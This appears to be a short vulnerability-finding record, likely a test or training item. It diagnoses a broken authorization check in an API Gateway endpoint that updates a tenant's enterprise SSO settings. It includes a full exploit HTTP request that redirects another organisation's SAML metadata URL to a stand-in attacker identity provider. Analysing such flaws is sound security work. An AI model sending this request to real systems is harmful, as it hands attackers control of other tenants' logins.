diagnosis: The endpoint updates enterprise Single Sign-On configurations using orgId from the URL path. Although the API Gateway Lambda authorizer populated x-authorizer-principal-id, the handler never checks whether the authenticated principal belongs to orgId or holds tenant administrator permissions. Any authenticated user can hijack an enterprise's SAML/SSO metadata URL.
exploit_request:
PUT /api/tenants/org_fortune500_corp/sso HTTP/1.1
Host: apigw.identity.enterprise.com
x-authorizer-principal-id: usr_attacker_sub
Content-Type: application/json

{"ssoMetadataUrl": "https://evil-idp.attacker.com/saml/metadata.xml", "enforceSso": true}
